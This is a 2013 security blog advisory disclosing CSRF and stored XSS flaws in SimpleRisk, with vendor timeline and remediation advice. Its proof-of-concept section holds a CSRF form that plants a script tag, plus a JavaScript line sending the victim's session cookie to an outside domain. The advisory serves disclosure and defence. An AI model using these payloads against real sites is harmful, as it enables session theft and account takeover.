<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />

	<title> SimpleRisk v.20130915-01 CSRF-XSS Account Compromise </title>
    <meta name="description" content="1. *Advisory Information*Title: SimpleRisk v.20130915-01 CSRF-XSS Account CompromiseAdvisory ID: RS-2013-0001Date Published: 2013-09-302. *Vulnerability Info...">

    <meta name="HandheldFriendly" content="True" />
    <meta name="MobileOptimized" content="320" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <link rel="stylesheet" type="text/css" href="/assets/css/normalize.css" />
    <link rel="stylesheet" type="text/css" href="/assets/css/screen.css" />
    <link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/css?family=Noto+Serif:400,700,400italic|Open+Sans:700,400" />
    <!-- This is for syntax highlight -->
    <link rel="stylesheet" type="text/css" href="/assets/css/syntax.css">
    <!-- Customisation  -->
    <link rel="stylesheet" type="text/css" href="/assets/css/main.css" />

    <link rel="apple-touch-icon-precomposed" sizes="57x57" href="https://dewhurstsecurity.com/img/favicomatic/apple-touch-icon-57x57.png" />
	<link rel="apple-touch-icon-precomposed" sizes="114x114" href="https://dewhurstsecurity.com/img/favicomatic/apple-touch-icon-114x114.png" />
	<link rel="apple-touch-icon-precomposed" sizes="72x72" href="https://dewhurstsecurity.com/img/favicomatic/apple-touch-icon-72x72.png" />
	<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://dewhurstsecurity.com/img/favicomatic/apple-touch-icon-144x144.png" />
	<link rel="apple-touch-icon-precomposed" sizes="60x60" href="https://dewhurstsecurity.com/img/favicomatic/apple-touch-icon-60x60.png" />
	<link rel="apple-touch-icon-precomposed" sizes="120x120" href="https://dewhurstsecurity.com/img/favicomatic/img/favicomatic/apple-touch-icon-120x120.png" />
	<link rel="apple-touch-icon-precomposed" sizes="76x76" href="https://dewhurstsecurity.com/img/favicomatic/apple-touch-icon-76x76.png" />
	<link rel="apple-touch-icon-precomposed" sizes="152x152" href="https://dewhurstsecurity.com/img/favicomatic/apple-touch-icon-152x152.png" />
	<link rel="icon" type="image/png" href="https://dewhurstsecurity.com/img/favicomatic/favicon-196x196.png" sizes="196x196" />
	<link rel="icon" type="image/png" href="https://dewhurstsecurity.com/img/favicomatic/favicon-96x96.png" sizes="96x96" />
	<link rel="icon" type="image/png" href="https://dewhurstsecurity.com/img/favicomatic/favicon-32x32.png" sizes="32x32" />
	<link rel="icon" type="image/png" href="https://dewhurstsecurity.com/img/favicomatic/favicon-16x16.png" sizes="16x16" />
	<link rel="icon" type="image/png" href="https://dewhurstsecurity.com/img/favicomatic/favicon-128.png" sizes="128x128" />
	<meta name="application-name" content="&nbsp;"/>
	<meta name="msapplication-TileColor" content="#FFFFFF" />
	<meta name="msapplication-TileImage" content="https://dewhurstsecurity.com/img/favicomatic/mstile-144x144.png" />
	<meta name="msapplication-square70x70logo" content="https://dewhurstsecurity.com/img/favicomatic/mstile-70x70.png" />
	<meta name="msapplication-square150x150logo" content="https://dewhurstsecurity.com/img/favicomatic/mstile-150x150.png" />
	<meta name="msapplication-wide310x150logo" content="https://dewhurstsecurity.com/img/favicomatic/mstile-310x150.png" />
	<meta name="msapplication-square310x310logo" content="https://dewhurstsecurity.com/img/favicomatic/mstile-310x310.png" />

</head>
<body class="home-template">


    <main class="content" role="main">

    <article class="post">
        <header class="post-header">
            <a id="blog-logo" href="http://blog.dewhurstsecurity.com">
                
                    <span class="blog-title">Dewhurst Security Blog</span>
                
            </a>
        </header>

        <span class="post-meta">
        	<time datetime="2013-09-30">30 Sep 2013</time>
        	
        		on
	        	
	        
       	</span>

        <h1 class="post-title">SimpleRisk v.20130915-01 CSRF-XSS Account Compromise</h1>

        <section class="post-content">
            <p>1. *Advisory Information*</p>

<p>Title: SimpleRisk v.20130915-01 CSRF-XSS Account Compromise<br />
Advisory ID: RS-2013-0001<br />
Date Published: 2013-09-30</p>
<p>2. *Vulnerability Information*</p>
<p>Type: Cross-Site Request Forgery (CSRF) [CWE-352, OWASP-A8], Cross-Site Scripting (XSS) [CWE-79, OWASP-A3]<br />
Impact: Full Account Compromise<br />
Remotely Exploitable: Yes<br />
Locally Exploitable: Yes<br />
Severity: High<br />
CVE-ID: CVE-2013-5748 (CSRF) and CVE-2013-5749 (non-httponly cookie)</p>
<p>3. *Software Description*</p>
<p>SimpleRisk a simple and free tool to perform risk management activities. Based entirely on open source technologies and sporting a Mozilla Public License 2.0, a SimpleRisk instance can be stood up in minutes and instantly provides the security professional with the ability to submit risks, plan mitigations, facilitate management reviews, prioritize for project planning, and track regular reviews. It is highly configurable and includes dynamic reporting and the ability to tweak risk formulas on the fly. It is under active development with new features being added all the time. SimpleRisk is truly Enterprise Risk Management simplified. [0]</p>
<p>Homepage: <a href="http://www.simplerisk.org/">http://www.simplerisk.org/</a><br />
Download: <a href="https://simplerisk.googlecode.com/files/simplerisk-20130915-001.tgz">https://simplerisk.googlecode.com/files/simplerisk-20130915-001.tgz</a></p>
<p><a id="more"></a><a id="more-17200"></a></p>
<p>4. *Vulnerability Description*</p>
<p>Cross-Site Request Forgery (CSRF) and Stored Cross-Site Scripting (XSS) have been discovered within SimpleRisk version 20130915-01 leading to complete account compromise. The CSRF vulnerability is used to deliver the XSS payload which accesses the authenticated user's session cookies and transmits them to a third-party domain under the attacker's control. Once the attacker has the user's session cookie, the attacker can authenticate to the application as the user.</p>
<p>5. *Vulnerable Packages*</p>
<p>Only version 20130915-01 was tested which was the latest version at the time of writing.</p>
<p>6. *Vendor Information, Solutions and Workarounds*</p>
<p>SimpleRisk released version 20130916-001 to address the issue.</p>
<p>7. *Credits*</p>
<p>These vulnerabilities were discovered by Ryan Dewhurst - <a href="http://www.randomstorm.com/">http://www.randomstorm.com/</a> - <a href="http://www.dewhurstsecurity.com/">http://www.dewhurstsecurity.com/</a></p>
<p>8. *Proof of Concept (PoC)*</p>
<p>8.1 *Cross-Site Request Forgery (CSRF)*</p>
<p>The following CSRF PoC submits a POST request to the prioritize_planning.php page with the XSS payload within the new_project parameter.</p>
<p>
<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;html&gt;</span>
  <span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">&quot;http://127.0.0.1/simplerisk/management/prioritize_planning.php&quot;</span> <span class="na">method=</span><span class="s">&quot;POST&quot;</span><span class="nt">&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name=</span><span class="s">&quot;new&amp;#95;project&quot;</span> <span class="na">value=</span><span class="s">&quot;&amp;lt;script&amp;#32;src&amp;#61;&amp;#47;&amp;#47;ethicalhack3r&amp;#46;co&amp;#46;uk&amp;#47;files&amp;#47;xss&amp;#47;c&amp;#46;j&amp;gt;&amp;lt;&amp;#47;script&amp;gt;&quot;</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name=</span><span class="s">&quot;add&amp;#95;project&quot;</span> <span class="na">value=</span><span class="s">&quot;Add&quot;</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name=</span><span class="s">&quot;projects&quot;</span> <span class="na">value=</span><span class="s">&quot;&quot;</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;submit&quot;</span> <span class="na">value=</span><span class="s">&quot;Submit request&quot;</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;/form&gt;</span>
  <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></div>
</p>

<p>8.2 *Stored Cross-Site Scripting (XSS)*</p>

<p>The prioritize_planning.php page accepts user supplied input via the new_project POST parameter and then later outputs that data to the page without first being sanitised or encoded. The following code was used to inject JavaScript into the application's back-end database.</p>

<p>Payload: &lt;script src=//ethicalhack3r.co.uk/files/xss/c.j&gt;&lt;/script&gt;<br />
Method: POST<br />
Parameter: new_project</p>

<p>The c.j JavaScript file contained the following code which sends the user's authenticated session cookie to a third-party domain:</p>

<p>document.write('&lt;img src=//ethicalhack3r.co.uk/srx=' + document.cookie + '&gt;');</p>

<p>9. *Remediation*</p>

<p>9.1 *Cross-Site Request Forgery (CSRF)*</p>

<p>Set per page anti-csrf tokens (nonces) which are submitted with requests and then validated by the server. Please refer to OWASP's CSRF Prevention Cheat Sheet for further information. [1]</p>

<p>9.2 *Cross-Site Scripting (XSS)*</p>

<p>Properly sanitise and encode user supplied input and output. Please refer to OWASP's XSS Prevention Cheat Sheet for further information. [2]</p>

<p>9.3 *Other Recommendations*</p>

<p>. Add the httponly flag to the session cookie so that JavaScript's document.cookie can not access it. [3]<br />
. Set the Content Security Policy (CSP) header to whitelist where JavaScript is allowed to be loaded from. [4]<br />
. Set the X-XSS-Protection header to ensure the browser's XSS filtering is enabled. (only works for reflected XSS) [5]</p>

<p>10. *Report Timeline*</p>

<p>2013-09-16: SimpleRisk notified of issue.<br />
2013-09-16: SimpleRisk acknoledged issue.<br />
2013-09-16: SimpleRisk release new version.<br />
2013-09-30: Advisory released.</p>

<p>11. *References*</p>

<p>[0] <a href="http://www.simplerisk.org/">http://www.simplerisk.org/</a><br />
[1] <a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet">https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet</a><br />
[2] <a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet">https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet</a><br />
[3] <a href="https://www.owasp.org/index.php/HttpOnly">https://www.owasp.org/index.php/HttpOnly</a><br />
[4] <a href="https://www.owasp.org/index.php/Content_Security_Policy">https://www.owasp.org/index.php/Content_Security_Policy</a><br />
[5] <a href="https://www.owasp.org/index.php/HTML5_Security_Cheat_Sheet#X-XSS-Protection">https://www.owasp.org/index.php/HTML5_Security_Cheat_Sheet#X-XSS-Protection</a><br />
[6] <a href="http://www.randomstorm.com/">http://www.randomstorm.com/</a><br />
[7] <a href="http://www.dewhurstsecurity.com/">http://www.dewhurstsecurity.com/</a></p>

        </section>

        

        <footer class="post-footer">
            <section class="hire-me">
              <h4><a href="https://dewhurstsecurity.com/">Dewhurst Security</a></h4>
            </section>

            <section class="share">
                <h4>Share this post</h4>
                <a class="icon-twitter" href="http://twitter.com/share?text=SimpleRisk v.20130915-01 CSRF-XSS Account Compromise&amp;url=http://blog.dewhurstsecurity.com/2013/09/30/simplerisk-v-20130915-01-csrf-xss-account-compromise.html"
                    onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
                    <span class="hidden">Twitter</span>
                </a>
                <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://blog.dewhurstsecurity.com/2013/09/30/simplerisk-v-20130915-01-csrf-xss-account-compromise.html"
                    onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
                    <span class="hidden">Facebook</span>
                </a>
                <a class="icon-google-plus" href="https://plus.google.com/share?url=http://blog.dewhurstsecurity.com/2013/09/30/simplerisk-v-20130915-01-csrf-xss-account-compromise.html"
                   onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
                    <span class="hidden">Google+</span>
                </a>
            </section>

        </footer>

    </article>

</main>


    <footer class="site-footer">
        <div class="inner">
            <section class="copyright">All content copyright <a href="https://dewhurstsecurity.com">Dewhurst Security</a> &copy;  &bull; All rights reserved.</section>
        </div>
    </footer>


    <script type="text/javascript" src="/assets/js/jquery-1.11.3.min.js"></script>
    <script type="text/javascript" src="/assets/js/jquery.fitvids.js"></script>
    <script type="text/javascript" src="/assets/js/index.js"></script>

    <!-- Google Analytics -->
    <script>
      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
      })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

      ga('create', 'UA-3292649-12', 'auto');
      ga('send', 'pageview');
    </script>

</body>
</html>
